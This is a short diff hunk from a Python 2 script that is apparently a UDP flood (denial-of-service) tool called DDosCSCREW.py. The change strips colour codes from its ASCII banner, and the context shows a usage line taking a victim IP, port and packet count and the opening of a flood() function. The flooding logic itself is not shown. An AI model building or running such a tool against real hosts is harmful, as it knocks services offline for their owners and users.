@@ -3,14 +3,14 @@ import socket
 import random
 import sys
 def usage():
-    print "#\033[1;91m    ######   ######   ######  ########  ######## ##      ## "
-    print "#\033[1;91m  ##    ## ##    ## ##    ## ##     ## ##       ##  ##  ## "
-    print "#\033[1:91m  ##       ##       ##       ##     ## ##       ##  ##  ## "
-    print "#\033[1;91m  ##        ######  ##       ########  ######   ##  ##  ## "
-    print "#\033[1;81m  ##             ## ##       ##   ##   ##       ##  ##  ## "
-    print "#\033[1;81m  ##    ## ##    ## ##    ## ##    ##  ##       ##  ##  ## "
-    print "#\033[1;81m   ######   ######   ######  ##     ## ########  ###  ###  "
-    print "#\033[1;81m  -------python2 DDosCSCREW.py <ip> <port> <packet>------- "
+    print "  ######   ######   ######  ########  ######## ##      ## "
+    print " ##    ## ##    ## ##    ## ##     ## ##       ##  ##  ## "
+    print " ##       ##       ##       ##     ## ##       ##  ##  ## "
+    print " ##        ######  ##       ########  ######   ##  ##  ## "
+    print " ##             ## ##       ##   ##   ##       ##  ##  ## "
+    print " ##    ## ##    ## ##    ## ##    ##  ##       ##  ##  ## "
+    print "  ######   ######   ######  ##     ## ########  ###  ###  "
+    print " -------python2 DDosCSCREW.py <ip> <port> <packet>------- "
 def flood(victim, vport, duration):
     
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
